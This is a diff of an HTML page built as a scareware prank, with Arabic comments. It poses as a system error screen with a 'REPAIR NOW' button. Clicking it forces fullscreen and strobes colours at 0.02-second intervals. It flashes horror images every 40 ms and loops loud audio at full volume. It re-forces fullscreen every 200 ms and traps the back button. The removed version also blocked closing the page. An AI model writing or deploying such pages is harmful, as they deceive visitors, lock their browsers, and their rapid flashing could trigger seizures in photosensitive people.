@@ -3,128 +3,97 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SYSTEM CRITICAL ERROR - 404</title>
+    <title>CRITICAL SYSTEM FAILURE</title>
     <style>
-        /* إعدادات الشاشة الأساسية سواسوة */
-        body, html { 
-            margin: 0; padding: 0; width: 100%; height: 100%; 
-            background: #000; overflow: hidden; cursor: none; 
-            user-select: none; -webkit-user-select: none;
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; cursor: none; }
+        
+        /* شاشة التمويه سواسوة */
+        #gate { 
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: #fff; z-index: 10000; display: flex; 
+            flex-direction: column; justify-content: center; align-items: center; 
+        }
+        .btn-fix { 
+            background: #ff0000; color: #fff; border: 10px solid #000; 
+            padding: 30px 60px; font-size: 30px; font-weight: bold; 
+            border-radius: 50px; cursor: pointer; box-shadow: 0 10px 0 #800;
         }
 
-        /* واجهة الدخول التمويهية سواسوة */
-        #loading_screen {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #fff; z-index: 10000; display: flex;
-            flex-direction: column; justify-content: center; align-items: center;
+        /* أنيميشن ألوان الفيروسات سواسوة */
+        @keyframes flash_rgb {
+            0% { background: #f00; } 25% { background: #0f0; } 
+            50% { background: #00f; } 75% { background: #ff0; } 100% { background: #f0f; }
         }
-        .warning-btn {
-            background: #ff0000; color: #fff; border: 10px solid #000;
-            padding: 30px 80px; font-size: 35px; font-weight: bold;
-            border-radius: 70px; cursor: pointer; box-shadow: 0 15px 0 #660000;
-            animation: pulse 1s infinite;
-        }
-        @keyframes pulse {
-            0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); }
-        }
-
-        /* أنيميشن ألوان الفيروسات القاتلة سواسوة */
-        @keyframes virus_bg {
-            0% { background: #ff0000; } 20% { background: #00ff00; }
-            40% { background: #0000ff; } 60% { background: #ffff00; }
-            80% { background: #ff00ff; } 100% { background: #00ffff; }
-        }
-        .active-chaos-bg { animation: virus_bg 0.03s infinite; }
+        .chaos-bg { animation: flash_rgb 0.02s infinite; }
 
         /* مصفوفة الصور المرعبة سواسوة */
-        #horror_container {
-            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-            display: none; z-index: 9999;
-        }
-        .horror-img {
-            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            object-fit: cover; opacity: 0; mix-blend-mode: difference;
+        .horror-wrap { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; display: none; }
+        .h-img { 
+            position: absolute; width: 100%; height: 100%; object-fit: cover; 
+            opacity: 0; mix-blend-mode: difference; 
         }
 
         /* أنيميشن الزلزال والقفز سواسوة */
-        @keyframes extreme_glitch {
-            0% { transform: translate(0,0) scale(1.2); filter: invert(0); }
-            10% { transform: translate(-50px, 40px) scale(1.6) rotate(5deg); filter: invert(1); }
-            20% { transform: translate(50px, -40px) scale(1.3) rotate(-5deg); }
-            40% { transform: translate(-60px, -60px) scale(1.8); filter: hue-rotate(180deg); }
-            60% { transform: translate(60px, 60px) scale(1.4) rotate(10deg); }
-            80% { transform: translate(-20px, 20px) scale(1.9); filter: contrast(5); }
-            100% { transform: translate(0,0) scale(1.5); }
+        @keyframes earthquake {
+            0% { transform: scale(1.1) translate(0,0); filter: invert(0); }
+            50% { transform: scale(1.5) translate(-30px, 30px) rotate(5deg); filter: invert(1); }
+            100% { transform: scale(1.2) translate(30px, -30px) rotate(-5deg); }
         }
-        .vibrate-active { opacity: 1 !important; animation: extreme_glitch 0.01s infinite linear; }
+        .active-horror { opacity: 1 !important; animation: earthquake 0.01s infinite linear; }
     </style>
 </head>
-<body id="main_body">
+<body id="b">
 
-    <div id="loading_screen">
-        <h1 style="font-family: sans-serif; margin-bottom: 20px;">SYSTEM UPDATE REQUIRED</h1>
-        <button class="warning-btn" onclick="startInfection()">UPDATE NOW</button>
+    <div id="gate">
+        <h2 style="font-family: Arial; color: #000;">SYSTEM ERROR DETECTED</h2>
+        <button class="btn-fix" onclick="launchInfection()">REPAIR NOW</button>
     </div>
 
-    <div id="horror_container">
-        <img class="horror-img" id="m1" src="https://telegra.ph/file/0c9783f946c5970c79e72.jpg">
-        <img class="horror-img" id="m2" src="https://telegra.ph/file/984b6555198e3b330349b.jpg">
-        <img class="horror-img" id="m3" src="https://telegra.ph/file/07f4369e9a4f664a79668.jpg">
-        <img class="horror-img" id="m4" src="https://telegra.ph/file/5a676b059635f308a0963.jpg">
-        <img class="horror-img" id="m5" src="https://telegra.ph/file/8296a256966141c2980bc.jpg">
+    <div id="horror_container" class="horror-wrap">
+        <img class="h-img" id="i1" src="https://i.ibb.co/RTTgVkyw/image.jpg">
+        <img class="h-img" id="i2" src="https://i.ibb.co/VYQnMt9R/image.jpg">
+        <img class="h-img" id="i3" src="https://i.ibb.co/ym4GK9sk/image.jpg">
+        <img class="h-img" id="i4" src="https://i.ibb.co/4H7RV4m/image.jpg">
     </div>
 
     <script>
-        const images = ['m1', 'm2', 'm3', 'm4', 'm5'];
-        const sounds = [
-            "https://www.myinstants.com/media/sounds/twahwih-94526.mp3",
-            "https://www.myinstants.com/media/sounds/w-rbk-shwl-hd-64729.mp3",
-            "https://www.myinstants.com/media/sounds/m-e-o-w-82698.mp3"
-        ];
-        let currentImg = 0;
+        const imgIds = ['i1', 'i2', 'i3', 'i4'];
+        // رابط الصوت المباشر اللي بعثته سواسوة
+        const audioSrc = "https://www.myinstants.com/media/sounds/aaaaaaaaaaaaaaaaaaaa-e-lutador.mp3";
 
-        function startInfection() {
-            // 1. تفعيل ملء الشاشة القسري سواسوة
-            const el = document.documentElement;
-            if (el.requestFullscreen) el.requestFullscreen();
-            else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
-
-            // 2. إخفاء البداية وتفعيل الفوضى سواسوة
-            document.getElementById('loading_screen').style.display = 'none';
-            document.getElementById('main_body').classList.add('active-chaos-bg');
+        function launchInfection() {
+            document.getElementById('gate').style.display = 'none';
+            document.getElementById('b').classList.add('chaos-bg');
             document.getElementById('horror_container').style.display = 'block';
 
-            // 3. محرك الأصوات الثلاثة مع تداخل (Overdrive) سواسوة
-            sounds.forEach(src => {
-                let audio = new Audio(src);
-                audio.loop = true;
-                audio.volume = 1.0;
-                const playAudio = () => audio.play().catch(() => setTimeout(playAudio, 50));
-                playAudio();
-            });
+            // ملء الشاشة القسري سواسوة
+            let el = document.documentElement;
+            if (el.requestFullscreen) el.requestFullscreen();
 
-            // 4. محرك تبديل الصور الفيروسي سواسوة
-            setInterval(() => {
-                document.getElementById(images[currentImg]).classList.remove('vibrate-active');
-                currentImg = (currentImg + 1) % images.length;
-                document.getElementById(images[currentImg]).classList.add('vibrate-active');
-            }, 40); // سرعة تبديل 40ms سواسوة
+            // تشغيل الصوت الجديد بقوة سواسوة
+            let audio = new Audio(audioSrc);
+            audio.loop = true;
+            audio.volume = 1.0;
+            const playFast = () => audio.play().catch(() => setTimeout(playFast, 50));
+            playFast();
 
-            // 5. نظام الحبس الرقمي (Lockdown) سواسوة
+            // تبديل الصور الفيروسي سواسوة
+            let current = 0;
             setInterval(() => {
-                if (!document.fullscreenElement) {
-                    if (el.requestFullscreen) el.requestFullscreen();
-                }
+                document.getElementById(imgIds[current]).classList.remove('active-horror');
+                current = (current + 1) % imgIds.length;
+                document.getElementById(imgIds[current]).classList.add('active-horror');
+            }, 40);
+
+            // نظام الحبس (Lockdown) سواسوة
+            setInterval(() => {
+                if (!document.fullscreenElement) el.requestFullscreen();
                 window.scrollTo(0, 0);
             }, 200);
 
-            // منع زر الرجوع سواسوة
             history.pushState(null, null, location.href);
             window.onpopstate = () => history.go(1);
         }
-
-        // منع إغلاق الصفحة سواسوة
-        window.onbeforeunload = () => "CRITICAL SYSTEM ERROR";
     </script>
 </body>
 </html>
